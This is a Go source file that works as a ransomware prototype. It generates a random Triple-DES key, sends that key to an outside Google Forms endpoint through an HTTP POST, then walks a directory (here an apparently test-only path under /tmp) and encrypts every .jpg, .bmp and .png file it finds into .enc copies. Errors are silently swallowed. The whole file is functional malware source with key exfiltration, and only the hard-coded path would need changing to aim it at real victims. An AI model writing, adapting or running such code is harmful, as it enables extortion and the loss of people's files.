package main

import (
	"crypto/des"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
)

func stringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func main() {
	key := make([]byte, 24)
	_, err := rand.Read(key)
	if err != nil {
		//
	}

	fmt.Println("key: ", base64.StdEncoding.EncodeToString(key))
	resp, err := http.PostForm("https://docs.google.com/forms/d/e/1FAIpQLSd4VFZA8Cw7ednO-FzLqqesH6wd2z_bxs8-gg6L87kdVvKzkw/formResponse",
		url.Values{"entry.825445648": {base64.StdEncoding.EncodeToString(key)}})
	
	if err != nil {
		//
	}
	if resp == nil {
		//
	}

	searchDir := string("/tmp/safety-folder-18972910")
	targetExt := []string{".jpg", ".bmp", ".png"}
	fileList := []string{}

	filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		if stringInSlice(filepath.Ext(path), targetExt) {
			fileList = append(fileList, path)
			originalData, err := ioutil.ReadFile(path)
			if err != nil {

			}
			cryp := encrypt(key, originalData)
			ioutil.WriteFile(path + ".enc", []byte(cryp), 0644)
		}
		return nil
	})

	for _, file := range fileList {
		fmt.Println(file)
	}


}

func encrypt(key []byte, text []byte) string {
	plaintext := []byte(text)

	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		panic(err)
	}

	ciphertext := make([]byte, des.BlockSize+len(plaintext))
	iv := ciphertext[:des.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[des.BlockSize:], plaintext)

	return base64.URLEncoding.EncodeToString(ciphertext)
}
